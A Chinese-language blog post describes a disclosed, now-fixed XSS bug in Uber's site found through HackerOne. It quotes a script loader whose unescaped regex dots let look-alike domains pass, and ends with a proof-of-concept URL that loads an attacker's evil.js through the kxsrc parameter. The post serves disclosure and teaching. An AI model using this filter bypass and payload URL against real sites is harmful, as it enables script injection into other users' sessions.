---
layout: post
title: Bypass uber xss regex filter
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - zhchbin</p>

## 前言

&nbsp;&nbsp;&nbsp;两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。

## 漏洞代码

在看Uber的网站前端JS代码的时候，发现有如下的一段代码：

{% highlight javascript %}
(function() {
    var k = document.createElement('script');  // 创建script标签
    k.type = 'text/javascript';
    k.async = true;
    k.setAttribute("data-id", u.pubid);
    k.className = "kxct";
    k.setAttribute("data-version", "1.9");

    // 从location.href参数中读取kxsrc
    var m, src = (m = location.href.match(/\bkxsrc=([^&]+)/)) && decodeURIComponent(m[1]);

    // 检查kxsrc参数的值是否满足正则，如果满足则加载，否则加载默认的JS文件 
    k.src = /^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d{1,5})?\/controltag\//i.test(src) ? src : src === "disable" ? "" : (location.protocol === "https:" ? "https:" : "http:") + "//cdn.krxd.net/controltag?confid=" + u.pubid;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(k, s);
})();
{% endhighlight %}

&nbsp;&nbsp;&nbsp;目前代码还能在：https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js 看到，不过修复之后相应的网站已经不会加载这个代码文件了。 通过阅读上面这段代码，我们能够知道参数是`kxsrc`是可以被用户控制的，而且如果满足一定条件，该参数所指定的js文件就会被加载。

## 漏洞分析

&nbsp;&nbsp;&nbsp;咋一看，这段代码似乎没有什么问题：JS文件只能是`krxd.net`域下的文件。然而，在正则表达式里：`.`代表的意思是匹配任意字符。我们来做一个简单的实验，F12打开浏览器的调试窗口：

{% highlight javascript %}
> /^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d{1,5})?\/controltag\//i.test('https://a.bkrxd.net/controltag/evil.js')
< true
> /^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d{1,5})?\/controltag\//i.test('https://a.ckrxd.net/controltag/evil.js')
< true
> /^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d{1,5})?\/controltag\//i.test('https://a.dkrxd.net/controltag/evil.js')
< true
>  /^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d{1,5})?\/controltag\//i.test('https://a.ekrxd.net/controltag/evil.js')
< true
>  /^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d{1,5})?\/controltag\//i.test('https://a.fkrxd.net/controltag/evil.js')
< true
>  /^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d{1,5})?\/controltag\//i.test('https://aafkrxd.net/controltag/evil.js')
< true
>  /^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d{1,5})?\/controltag\//i.test('https://abfkrxd.net/controltag/evil.js')
< true
{% endhighlight %}

<img src="http://ww3.sinaimg.cn/large/7184df6bgw1f7otlqoccoj211i03xjsu.jpg">

## PoC

买个域名！部署一下HTTPS！写一个简单的JS文件！添加到参数里！Bingo，就是这么神奇！

{% highlight javascript %}
https://www.uber.com/?exp=hp-c&kxsrc=https%3A%2F%2Fwww.akrxd.net%2Fcontroltag%2Fevil.js
{% endhighlight %}

<img src="http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif">